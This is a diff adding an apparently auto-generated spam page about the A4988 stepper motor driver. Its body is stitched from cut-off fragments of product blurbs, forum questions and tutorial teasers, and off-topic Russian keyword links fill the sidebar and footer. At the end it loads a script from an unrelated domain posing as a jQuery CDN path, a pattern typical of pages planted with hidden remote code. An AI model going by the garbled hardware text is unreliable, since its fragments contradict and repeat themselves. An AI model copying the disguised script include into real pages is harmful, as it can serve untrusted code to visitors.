@@ -1,0 +1,155 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Stepper motor driver a4988 - hahgheino.0x7c00.cn</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">hahgheino.0x7c00.cn</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Stepper motor driver a4988</h2>
+                            </header>
+                            <p>This breakout board for Allegro's A4988 microstepping bipolar stepper motor driver features adjustable current limiting, over-current and over-temperature protection, and five different microstep resolutions (down to 1/16-step). It operates from 8 V to 35 V and can deliver I'm making a camera slider for my DSLR. I need to be able to control the speed and direction of my stepper motor with a rotary encoder. As of right now I am only able to control the speed a little bit (not as fast or as slow as I would like) and can only move the stepper in one direction. gt// defines pins numbers gt gtconst int stepPin = 8; gt gtconst int dirPin = 9; gt gt gt gt gt gt gt gt// gt gt gt gtint val; gt gtint. In this tutorial you will learn how to control a stepper motor with A4988, AccelStepper and Arduino. Wiring diagram and many example codes included. I'll soon power on the RAMPS 1.4 to see if everything works just fine, because I believe the time for a first test has come, but in order to do it I need a Power Supply. In a previous thread I've been recommended to buy and use an ATX Power Supply , which I'm currently searching on Amazon. But in the meantime I'm planning on using my Mendel i3 clone's PSU as my DIY 3D Printer's temporary PSU. This (https://imgur.com/a/0uYz7) is the PSU and these below are its technical specifica. https://howtomechatronics.com/tutoria. Find more details, circuit schematics and source codes here. In this tutorial we will learn how to control a Stepper Motor using the A4988 Stepper Driver. Visit HowToMechatronics.com for more Tutorials, Tips, Projects and How It Works videos. 
+I can't get the stepper motors to move on my DIY T8 CNC router. I'm 99% sure my wiring is correct, and I flashed GRBL successfully. I can turn the spindle on and off, but when I try to jog the steppers, the values on the screen go up and down but the motors do nothing. If anyone has any advice or even a clue as to what more I could test, I'd appreciate the help (I'm completely inexperienced). Things I know: My Arduino Uno clone has power My CNC shield has power My stepper motor driver. Learn about A4988 Stepper Motor Driver along with Pinout, Wiring, Arduino Code for Microstepping, Controlling Speed & Direction of NEMA 17 Stepper Motor. I have arduino nano and when i work with stepper motor drivers (A4988). When motor is powered via external power supply, my mouse and keyboard went crazy turning off and on. Arduino is connected with USB whole time. When I turn motor off, everything is back to normal. Does someone also have this problem, and is it dangerous for my motherboard and computer? P.S. sorry for weird English, Im not a native speaker. Using the driver Minimal wiring diagram for connecting a microcontroller to an A4988 stepper motor driver carrier (full-step mode). Power connections. Can someone explain to me how to figure out the correct current limiting on this stepper motor driver? A4988 driver (https://www.pololu.com/product/2128) Motor ( runs 24v with 10 ohm coils but says 500mA per phase 19.5V power supply I'm not sure how to figure out what the current limit should be. The A4988 datasheet says that the motor is limited to 70% of the current limit. Thanks A4988 is a complete driver for microstepping motor with bydefault translator for easy operation. It specially designed to drive bipolar microstepping motors. I'm trying to build a simple CNC plotter using old printer stepper motors. I designed and etched a CNC control board which is pretty much a DIY arduino with the stepper motor drivers (A4988) included as well as some break out pins for limit switches and such. I have connected it all up and succesfully (i think) flashed the grbl firmware onto the DIY arduino. It wont move any of the stepper motors when i send commands through the Universal G-Code sender and i just cant seem to pinpoint 
+If you've come to this article, you're probably at the same point as I was before I made my stepper motor move without noise, vibration or jump steps. That's why in this article, I will provide a sufficient level of depth to know how to control a stepper motor (for example. Hey guys, I am lost. I have ordered parts multiple times online because of various tutorials have showed me ways to do it. I am beginning to understand that it isn't a part problem but a me problem haha. The goal of the project is just to get the stepper motor to make one rotation. Basically just to make the motor work. I am using a Nema 17 stepper motor, Arduino uno, A4988 Stepper Motor Driver and an external battery to power the motor. If you guys can look at my project Drive a Stepper Motor With an Arduino and a A4988 Stepstick/Pololu Driver: There are several ways to make a Stepper Motor run, and the best way will depend on the application, the motor and the electronics available. For running a stepper motor from an Arduino these Before I start, the hardware I'm using is an Arduino Nano, a A4988 Stepper Driver, running a Wantai (Model: 42BYGHW609). I've set up the most basic connection as shown on various people's posts. Power from the Arduino going into VDD, 12v coming from a modified computer PSU to VMOT (Everything with a shared ground). I have two inputs from the Arduino driving STEP and DIR. I've used the code given by Polulu, as well as 'How To Mechatronics', which is basically the same code. The code is working. A4988 DMOS Microstepping Driver with Translator and Overcurrent Protection. This stepper motor driver lets you control one bipolar stepper motor at up to 2 A output current per coil. Here are some of the driver's key features: Simple step and direction control interface Five different. I'm trying to setup a simple 3axis CNC using stepper motors from an old 3d printer. The motors worked perfectly when I pulled them from the machine, other things were worn out. Here is a page of an identical motor (https://www.alibaba.com/product-detail/NEMA-17-STEPPER-MOTOR-1-33A_60338816165.html?spm=a2700.7724838.2017115.55.47147af84rkTD1). I'm using A4988 chips as drivers with my Uno. I'm currently using a cheap variable DC power supply to run the motor driver, Uno ran from PC power. Bench. The A4988 is a complete microstepping motor driver with built-in translator for easy operation. It is designed to operate bipolar stepper motors in full-, half-, quarter-, eighth-, and sixteenth-step modes, with an output drive capacity of up to 35 V and ±2 A. The A4988 includes a fixed. 
+So I'm trying to make scissors which cut through green onions. They work similarly to the ones shown in this video: https://www.youtube.com/watch?time_continue=23ampv=wRkucwobOdU. I am working with this kit: https://www.amazon.com/gp/product/B016D5KUHS/ref=oh_aui_search_asin_title?ie=UTF8amppsc=1, which comes with a 28BYJ-48 Stepper Motor. But the motor is nowhere near strong enough to cut. And as a side note, I am very new to Arduino so if you could dumb down your answer for me that would. A4988 Stepper Motor Driver Carrier, Black Edition A4988 stepper motor driver carrier, Black Edition, bottom view with dimensions. Overview This product is a carrier board or breakout board for Allegro's A4988 DMOS Microstepping Driver. Motor: https://www.omc-stepperonline.com/hybrid-stepper-motor/nema-23-bipolar-18deg-06nm-85ozin-088a-66v-57x57x41mm-4-wires-23hs16-0884s.html Using a 12V 30A Power supply. Find great deals on eBay for a4988 stepper motor driver. Shop with confidence. Hey guys, I am lost. I have ordered parts multiple times online because of various tutorials have showed me ways to do it. I am beginning to understand that it isn't a part problem but a me problem haha. The goal of the project is just to get the stepper motor to make one rotation. Basically just to make the motor work. I am using a Nema 17 stepper motor, Arduino uno, A4988 Stepper Motor Driver and an external battery to power the motor. If you guys can look at my project The A4988 is a stepper motor driver board that has on a A4988_chip that enables control of stepper motors through arduino type programming firmware and software.  
+I really need help. I'm trying to learn how to control a 200 step, 1.8 degree stepper motor with an A4988 Stepper Motor driver and arduino. I'm having trouble finding example codes that work at all, or when they do work and something happens, I have no idea if the motor is spinning Hi guys I'm new to Reddit also to Arduino 😅 . I'm an interior designer and I love photography . I know very little about electronics ,I wanted to make a slider for timelapse photography with pan amp tilt head for my Cannon 650d dslr . Now here is the problem, l bought three stepper motors one is nema 23 3 amp bipolar stepper with TB6560 stepper driver to hookup to Arduino uno for sliding motion with no problem in connections or working . The other two for the head are (STP-42D2022) Discontinued product, replaced by A4988. Used in A4983 Breakout Board. Allegro: A4988: 2 A : QFN Used in Pololu stepper driver boards and the G3D driver. . Modern stepper motor drivers have "thermal shutdown" -- when they sense they are getting I've been building a macro focus stacking rail. It uses a stepper motor which turns a screw pushing a carriage forward on a frame. The carriage has a camera on it. The intention is to be able to move it a small amount \~10µm with each step and take a photo with the camera. It works somewhat, but, to my surprise, the motor sometimes steps backwards. In the linked video, the motor should be driven forwards at a constant rate, but instead, it stays still at some points, and at other points 
+Making a stepper motor move is easy with an A4988 driver. I'll show you how with code and examples. I have a CR-10 mini and an anycubic kossel. I installed stepper dampers (the metal plates with rubber in the middle) to my CR-10 mini and it made a world of difference to the noise level. Now that I have a kossel, I wanted to quiet it down so I ordered another 3 dampers, which are still in the mail. The kossel's mainboard allows the drivers to be replaced, so I'm mulling over whether I should buy some TMC2208s to repace the stock A4988's. The intention is to improve print quality (less artefa. Stepper motor driver Allegro's A4988 DMOS Micro-stepping Driver with adjustable current limiting, overcurrent and overtemperature protection, and five different microstep resolutions (down to 1/16-step). The driver requires a logic supply voltage (3 - 5.5 V) and a motor supply voltage. Does anyone know or have tried to control these stepper motors with the regular step stick (A4988) stepper drivers with an Arduino? What success did you have? Any help would be appreciated. 
+ELEGOO Stepstick Stepper Motor Driver Module A4988 + Heat Sink for 3D Printer Reprap, CNC Machine or Robotics(Pack Hello friends. In this tutorial we will learn how to run and control speed of Stepper motor using Arduino, A4988 driver IC and Potentiometer. You can watch the following video or you can continue to read this post for complete tutorial. My friend and I are building a 3d printer for our science fair and we were confused about how to choose the correct stepper drivers. What should we know about stepper drivers so that we don't ruin our board. How To Control a Stepper Motor with A4988 Driver with Arduino ? In this tutorial we will learn how to control a Stepper Motor using the A4988 Stepper Driver Board. 
+This is our weekly thread for all questions related to RepRaps or the RepRap project ( If you need help with something - eg assembly, part selection, print quality, calibration, etc. - this is also the place for troubleshooting. If your 3D printer isn't a RepRap, try /r/3Dprinting. Arduino library for A4988, DRV8825, DRV8834, DRV8880 and generic two-pin (DIR/STEP) stepper motor drivers - laurb9/StepperDriver. I'm planning to build a new 3d printer (corexy 30cm build size) and i'm still not sure about what drivers to use : a4988 - on my current 3d printer, everything works fine, so no complaints drv8825 - same price level as the a4988, i see some people complain about it skipping steps but most of them on 24v machines (i'll be building a 12v one) tmc drivers - expensive but quiet I have no problem with the noise, i'm interested in print quality alone, so which one should This product is a carrier board or breakout board for Allegro's A4988 DMOS Microstepping Driver with Translator and Overcurrent Protection; we therefore recommend careful reading of the A4988 datasheet (1MB pdf) before using this product. This stepper motor driver lets you control one bipolar. I am using a CNC motor shield (https://www.amazon.com/gp/product/B015DKD24W/ref=oh_aui_search_detailpage?ie=UTF8amppsc=1) with A4988 drivers (https://www.pololu.com/product/1182). I'm not sure if the CNC shield came with exact same driver as pololu page but I assume they are similar. I followed the instruction and set the driver potentiometer as described in the video, but my motor doesn't receive enough torque. I measured current from one of the stepper motor's coil and there is nothing. StepStick A4988 Stepper Driver Module. From Geeetech Wiki. Jump to: navigation, search. Contents. 1 Overview; 2 Features; 3 Document; 4 Usage; 5 Example code;  Connecting or disconnecting a stepper motor while the driver is powered can destroy the driver. Hi! I bought a Haydon LC1574W linear actuator for a small project I'm working on. I have an A4988 Pololu stepper motor driver, is it possible to control the Haydon linear actuator using this stepper motor driver? So far I have connected the stepper driver as explained in this article: However when I measure the voltage at the 2B,2A,1A,1B pins they seem to be constant at 5.5V without. 
+This product is a carrier board or breakout board for Allegro's A4988 DMOS Microstepping Driver with Translator and Overcurrent Protection; we therefore recommend careful reading of the A4988 datasheet (linked below) before using this product. https://www.pololu.com/product/1182 and https://www.sparkfun.com/products/12779. Find great deals on eBay for stepper motor driver a4988. Shop with confidence. (Forgive me if this is the wrong place, but I found an old post of someone with the same request. ) I have an urgent project that needs to be done Tuesday. No overnight shipping this weekend with the holiday. I need a A4988 Stepper Motor Driver for controller for controlling a Kysan 1124090 stepper motor. Anyone have one they'd sell me? Any stores that sell this in the area? Any help or leads is greatly appreciated. Description: A4988 is a complete microstepping motor driver with built-in translator for easy operation. This product is available 
+Wholesale Trader of Motor Driver Boards & Modules - Stepper Motor A4988, Stepper Motor Driver 8825, XL 6009 DC to DC Step Up Converter and Joystick Module offered by Micron, Mumbai, Maharashtra. Based on Allegro's A4988 microstepping bipolar stepper motor driver. The driver features adjustable current limiting, overcurrent and overtemperature protection, and five different microstep resolutions (down to 1/16-step). Feature: A4988 is a complete microstepping motor driver with built-in translator for easy operation. The product can be full, half, 1/4, 1/8 and 1/16 step mode to operate bipolar stepper motor. This breakout board for Allegro’s A4988 microstepping bipolar stepper motor driver features adjustable current limiting, over-current This breakout board for TI’s DRV8825 microstepping bipolar stepper motor driver features adjustable current limiting, over-current and over-temperature. Drive a Stepper Motor With an Arduino and a A4988 Stepstick/Pololu Driver: There are several ways to make a Stepper Motor run, and the best way will depend. Description: The Big Easy Driver is a stepper motor driver board for bi-polar stepper motors up to 2A/phase. It is based on the Allegro A4983 or A4988 stepper. Dual bipolar stepper motor shield for arduino (DRV8825) is a stepper motor driver based on DRV8825 stepper driver. 
+The A4988 is a stepper motor driver board that has on a A4988_chip that enables control of stepper motors through arduino type programming firmware and software. Using a Single-Axis TB6560 Stepper Driver With GRBL/RAMPS: I developed an obsession with laser engravers and CNC routers and 3d printers. I first bought. The Big Easy Driver, designed by Brian Schmalz ( is a stepper motor driver board for bi-polar stepper motors Types of stepper motor. Their are many types of stepper motors available but the two most common types are. Unipolar Stepper Motor– Has simple driver requirement. This breakout board for Allegro’s A4988 microstepping bipolar stepper motor driver features adjustable current limiting, over-current and over-temperature protection, and five different microstep resolutions (down to 1/16-step). It operates from 8 V to 35 V and can deliver In this tutorial you will learn how to control a stepper motor with A4988, AccelStepper and Arduino. Wiring diagram and many example codes included. 
+https://howtomechatronics.com/tutoria. Find more details, circuit schematics and source codes here. In this tutorial we will learn how to control a Stepper Motor using the A4988 Stepper Driver. Visit HowToMechatronics.com for more Tutorials, Tips, Projects and How It Works videos. Learn about A4988 Stepper Motor Driver along with Pinout, Wiring, Arduino Code for Microstepping, Controlling Speed Direction of NEMA 17 Stepper Motor. Using the driver Minimal wiring diagram for connecting a microcontroller to an A4988 stepper motor driver carrier (full-step mode). Power connections. A4988 is a complete driver for microstepping motor with bydefault translator for easy operation. It specially designed to drive bipolar microstepping motors. If you’ve come to this article, you’re probably at the same point as I was before I made my stepper motor move without noise, vibration or jump steps. That’s why in this article, I will provide a sufficient level of depth to know how to control a stepper motor (for example Drive a Stepper Motor With an Arduino and a A4988 Stepstick/Pololu Driver: There are several ways to make a Stepper Motor run, and the best way will depend on the application, the motor and the electronics available. For running a stepper motor from an Arduino these A4988 DMOS Microstepping Driver with Translator and Overcurrent Protection. This stepper motor driver lets you control one bipolar stepper motor at up to 2 A output current per coil. Here are some of the driver’s key features: Simple step and direction control interface Five different. 
+The A4988 is a complete microstepping motor driver with built-in translator for easy operation. It is designed to operate bipolar stepper motors in full-, half-, quarter-, eighth-, and sixteenth-step modes, with an output drive capacity of up to 35 V and 2 A. The A4988 includes a fixed. A4988 Stepper Motor Driver Carrier, Black Edition A4988 stepper motor driver carrier, Black Edition, bottom view with dimensions. Overview This product is a carrier board or breakout board for Allegro’s A4988 DMOS Microstepping Driver. Find great deals on eBay for a4988 stepper motor driver. Shop with confidence. I really need help. I'm trying to learn how to control a 200 step, 1.8 degree stepper motor with an A4988 Stepper Motor driver and arduino. I'm having trouble finding example codes that work at all, or when they do work and something happens, I have no idea if the motor is spinning Discontinued product, replaced by A4988. Used in A4983 Breakout Board. Allegro: A4988: 2 A : QFN Used in Pololu stepper driver boards and the G3D driver. . Modern stepper motor drivers have thermal shutdown -- when they sense they are getting Making a stepper motor move is easy with an A4988 driver. I'll show you how with code and examples. Stepper motor driver Allegro’s A4988 DMOS Micro-stepping Driver with adjustable current limiting, overcurrent and overtemperature protection, and five different microstep resolutions (down to 1/16-step). The driver requires a logic supply voltage (3 – 5.5 V) and a motor supply voltage. ELEGOO Stepstick Stepper Motor Driver Module A4988 + Heat Sink for 3D Printer Reprap, CNC Machine or Robotics(Pack 
+Hello friends. In this tutorial we will learn how to run and control speed of Stepper motor using Arduino, A4988 driver IC and Potentiometer. You can watch the following video or you can continue to read this post for complete tutorial. How To Control a Stepper Motor with A4988 Driver with Arduino ? In this tutorial we will learn how to control a Stepper Motor using the A4988 Stepper Driver Board. Arduino library for A4988, DRV8825, DRV8834, DRV8880 and generic two-pin (DIR/STEP) stepper motor drivers - laurb9/StepperDriver. This product is a carrier board or breakout board for Allegro’s A4988 DMOS Microstepping Driver with Translator and Overcurrent Protection; we therefore recommend careful reading of the A4988 datasheet (1MB pdf) before using this product. This stepper motor driver lets you control one bipolar. 
+StepStick A4988 Stepper Driver Module. From Geeetech Wiki. Jump to: navigation, search. Contents. 1 Overview; 2 Features; 3 Document; 4 Usage; 5 Example code;  Connecting or disconnecting a stepper motor while the driver is powered can destroy the driver. This product is a carrier board or breakout board for Allegro’s A4988 DMOS Microstepping Driver with Translator and Overcurrent Protection; we therefore recommend careful reading of the A4988 datasheet (linked below) before using this product. Find great deals on eBay for stepper motor driver a4988. Shop with confidence. Description: A4988 is a complete microstepping motor driver with built-in translator for easy operation. This product is available Wholesale Trader of Motor Driver Boards Modules - Stepper Motor A4988, Stepper Motor Driver 8825, XL 6009 DC to DC Step Up Converter and Joystick Module. Based on Allegro’s A4988 microstepping bipolar stepper motor driver. The driver features adjustable current limiting, overcurrent and overtemperature protection, and five different microstep resolutions (down to 1/16-step). 
+Feature: A4988 is a complete microstepping motor driver with built-in translator for easy operation. The product can be full, half, 1/4, 1/8 and 1/16 step mode to operate bipolar stepper motor. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="cne5-skyrim-mody-odezhda-dlya-magov.html">Skyrim моды одежда для магов</a></li>
+                                <li><a href="cne5-russkie-shrifty-dlya-vorda-2007.html">Русские шрифты для ворда 2007</a></li>
+                                <li><a href="cne5-liv-yagrell.html">Лив ягрелл</a></li>
+                                <li><a href="cne5-shema-termoregulyator-s-termoparoy.html">Схема терморегулятор с термопарой</a></li>
+                                <li><a href="cne5-prezentaciya-multiplikator-ekonomika.html">Презентация мультипликатор экономика</a></li>
+                                <li><a href="cne5-moborobo-torrent.html">Moborobo торрент</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="cne5-skachat-drayver-dlya-setevogo-adaptera-toshiba-satellite.html">Скачать драйвер для сетевого адаптера toshiba satellite</a></li>
+                                            <li><a href="cne5-uchebnik-matematiki-bunimovich-5-klass-skachat.html">Учебник математики бунимович 5 класс скачать</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="cne5-raspisanie-elektrichek-paveleckaya-stupino-segodnya.html">Расписание электричек павелецкая ступино сегодня</a></li>
+                                            <li><a href="cne5-zayavlenie-o-podache-na-razvod-obrazec.html">Заявление о подаче на развод образец</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="cne5-povest-gogolya-portret-kratkoe-soderzhanie-slushat.html">Повесть гоголя портрет краткое содержание слушать</a></li>
+                                            <li><a href="cne5-gost-venik-sorgo.html">Гост веник сорго</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="cne5-vyazhem-kryuchkom-dlya-devochek-sarafany-shemy.html">Вяжем крючком для девочек сарафаны схемы</a></li>
+                                            <li><a href="cne5-neuzheli-ya-geniy-audiokniga.html">Неужели я гений аудиокнига</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
